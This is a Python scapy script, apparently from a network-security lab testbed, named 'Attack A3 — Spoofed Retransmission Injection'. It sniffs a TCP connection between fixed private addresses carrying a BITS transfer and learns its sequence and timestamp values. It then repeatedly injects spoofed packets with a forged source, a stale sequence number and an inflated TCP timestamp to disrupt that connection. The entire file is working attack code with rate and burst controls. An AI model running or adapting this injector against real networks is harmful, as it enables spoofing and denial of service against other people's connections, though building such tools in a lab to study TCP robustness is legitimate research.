#!/usr/bin/env python3

import argparse
import signal
import sys
import time
from scapy.all import IP, TCP, Raw, send, sniff, conf

args = None
running = True
connection_state = {
    "highest_seq": 0,
    "highest_ts": 0,
    "initialized": False,
}
injection_stats = {
    "injected": 0,
    "start_time": 0,
}


def signal_handler(sig, frame):
    global running
    running = False
    print("\n[A3] Stopping...")


def learn_connection_state(pkt):
    if not pkt.haslayer(TCP):
        return

    if pkt[IP].src != "10.0.1.1" or pkt[IP].dst != "10.0.2.100":
        return

    seq = pkt[TCP].seq
    payload_len = len(pkt[TCP].payload) if pkt[TCP].payload else 0

    end_seq = seq + payload_len
    if end_seq > connection_state["highest_seq"]:
        connection_state["highest_seq"] = end_seq

    for name, val in pkt[TCP].options:
        if name == "Timestamp":
            tsval, tsecr = val
            if tsval > connection_state["highest_ts"]:
                connection_state["highest_ts"] = tsval
            break

    if not connection_state["initialized"] and connection_state["highest_seq"] > 0:
        connection_state["initialized"] = True
        print(f"[A3] Connection state learned:")
        print(f"     Highest SEQ: {connection_state['highest_seq']}")
        print(f"     Highest TS:  {connection_state['highest_ts']}")


def inject_spoofed_retransmission():
    if not connection_state["initialized"]:
        return False

    old_seq = max(0, connection_state["highest_seq"] - 50000)

    spoofed_ts = connection_state["highest_ts"] + 100

    pkt = (
        IP(src="10.0.1.1", dst="10.0.2.100", ttl=64) /
        TCP(
            sport=args.sport,
            dport=args.dport,
            seq=old_seq,
            flags="PA",
            options=[("Timestamp", (spoofed_ts, 0))],
        ) /
        Raw(b"\x00" * 100)
    )

    send(pkt, iface=args.iface, verbose=False)
    injection_stats["injected"] += 1
    return True


def main():
    global args, running

    parser = argparse.ArgumentParser(description="A3: Spoofed Retransmission Injection")
    parser.add_argument("--iface", required=True,
                        help="Interface facing Router/Host R (e.g., en9)")
    parser.add_argument("--sport", type=int, required=True,
                        help="Source port of the target connection (Host S's port)")
    parser.add_argument("--dport", type=int, default=8080,
                        help="Destination port on Host R (default: 8080)")
    parser.add_argument("--rate", type=float, required=True,
                        help="Injections per second")
    parser.add_argument("--burst", type=int, default=1,
                        help="Packets per injection burst (default: 1)")
    parser.add_argument("--duration", type=int, default=0,
                        help="Duration in seconds (0 = run until Ctrl+C)")
    parser.add_argument("--sniff-iface", default=None,
                        help="Interface to sniff for learning state (default: same as --iface)")
    args = parser.parse_args()

    if args.sniff_iface is None:
        args.sniff_iface = args.iface

    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    print("=============================================")
    print(" Attack A3 — Spoofed Retransmission Injection")
    print(f" Interface: {args.iface}")
    print(f" Target: 10.0.1.1:{args.sport} → 10.0.2.100:{args.dport}")
    print(f" Rate: {args.rate} injections/sec")
    print(f" Burst size: {args.burst} packets")
    if args.duration > 0:
        print(f" Duration: {args.duration}s")
    print("=============================================")
    print("")

    print("[A3] Phase 1: Learning connection state (sniffing for 5 seconds)...")
    print("[A3] Make sure the BITS transfer is already running on Host R.")
    print("")

    sniff(
        iface=args.sniff_iface,
        filter="src host 10.0.1.1 and dst host 10.0.2.100 and tcp",
        prn=learn_connection_state,
        timeout=5,
        store=False,
    )

    if not connection_state["initialized"]:
        print("[A3] ERROR: Could not learn connection state.")
        print("[A3] Is the BITS transfer running? Is the sniff interface correct?")
        sys.exit(1)

    print("")
    print(f"[A3] State learned. Highest SEQ={connection_state['highest_seq']}, "
          f"TS={connection_state['highest_ts']}")

    print("")
    print("[A3] Phase 2: Starting injection...")

    injection_stats["start_time"] = time.time()
    interval = 1.0 / args.rate

    import threading
    sniff_thread = threading.Thread(
        target=lambda: sniff(
            iface=args.sniff_iface,
            filter="src host 10.0.1.1 and dst host 10.0.2.100 and tcp",
            prn=learn_connection_state,
            store=False,
            stop_filter=lambda _: not running,
        ),
        daemon=True,
    )
    sniff_thread.start()

    while running:
        elapsed = time.time() - injection_stats["start_time"]

        if args.duration > 0 and elapsed >= args.duration:
            break

        for _ in range(args.burst):
            inject_spoofed_retransmission()

        if injection_stats["injected"] % 10 == 0:
            print(f"[A3] {elapsed:.0f}s | injected={injection_stats['injected']} | "
                  f"SEQ={connection_state['highest_seq']} TS={connection_state['highest_ts']}")

        time.sleep(interval)

    elapsed = time.time() - injection_stats["start_time"]
    print("")
    print("=============================================")
    print(f" A3 Complete — {elapsed:.1f}s")
    print(f" Total injected: {injection_stats['injected']}")
    if elapsed > 0:
        print(f" Effective rate: {injection_stats['injected']/elapsed:.2f} pkt/s")
        bytes_injected = injection_stats["injected"] * 154  # approx IP+TCP+payload
        print(f" Attack bandwidth: {bytes_injected/elapsed:.0f} bytes/s")
    print("=============================================")


if __name__ == "__main__":
    main()
